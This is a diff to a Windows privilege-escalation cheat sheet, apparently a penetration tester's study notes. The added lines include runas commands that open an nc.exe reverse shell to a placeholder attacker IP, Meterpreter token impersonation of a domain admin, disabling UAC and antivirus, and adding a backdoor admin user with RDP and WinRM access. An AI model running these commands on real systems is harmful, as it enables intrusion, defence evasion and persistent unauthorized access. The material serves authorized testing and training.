@@ -604,6 +604,16 @@ oLink.Save
 * Look for possbible vulnerable apps using `seatbelt.exe` on victim or `tasklist /V` or `winpeas.exe quiet processinfo`
 * find the exploit on `exploit.db` as shown above
 
+#### User impersonation
+
+```powershell
+## SU ON WINDOWS = runas
+
+C:\Windows\System32\runas.exe /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
+
+# IF THE USER SAVED THE CREDENTIALS
+C:\Windows\System32\runas.exe /savecred /user:<username> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
+```
 
 #### Token Impersonation
 
@@ -613,6 +623,19 @@ oLink.Save
 
 But there are also more thechniques such as printspoofer: https://juggernaut-sec.com/seimpersonateprivilege/
 
+
+```powershell
+
+## TOKEN IMPERSONATION
+# IN METERPRETER SESSION ON THE COMPROMISED WINDOWS HOST
+
+load incognito
+list_tokens -u
+# CHOSE A DOMAIN ADMIN WHICH YOU WANT TO IMPERSONATE
+
+impersonate_token domain\\username
+
+```
 
 ##### PrintSpoofer
 
@@ -870,36 +893,45 @@ Or connect as other service if needed from victim
 .\psexec.exe /accepteula -i -u "nt authority\local service" c:\rev_shell.exe
 ```
 
-* look for stuff
-`Get-Childitem -Path C:\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue`
+```powershell
+# SET UAC TO 0
+C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
 
-* enable RDP
+# TURN OFF ANTIVIRUS
+run killav
+
+
+
+# enable RDP
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 
-* add user
+#* add user
 net user Pentester Password1 /ADD
 
-* give admin rights
+#* give admin rights
 net localgroup Administrators Pentester /ADD
 
-* add to RDP group
+#* add to RDP group
 
 powershell -nop -c "Add-LocalGroupMember -Group "Remote Desktop Users" -Member "Pentester""
 
 net localgroup "Remote Desktop Users" Pentester /add
 
-* Enable winrm to be evil
+#* Enable winrm to be evil
 
 Enable-PSRemoting -SkipNetworkProfileCheck -Force
 
-OR
+#OR
 
-`winrm quickconfig -y`
+winrm quickconfig -y
 
-guide to evil-winrm: https://github.com/Hackplayers/evil-winrm
+# REBOOT THE SYSTEM
+shutdown /r
+
+```
 
 * RDP into machine
 
-xfreerdp /cert:ignore /dynamic-resolution /clipboard /auto-reconnect /u:jeff /p:'HenchmanPutridBonbon11' /v:192.168.244.75
+`xfreerdp /cert:ignore /dynamic-resolution /clipboard /auto-reconnect /u:jeff /p:'HenchmanPutridBonbon11' /v:192.168.244.75`
 
-use /pth: for pass the hash attack
+use `/pth:` for pass the hash
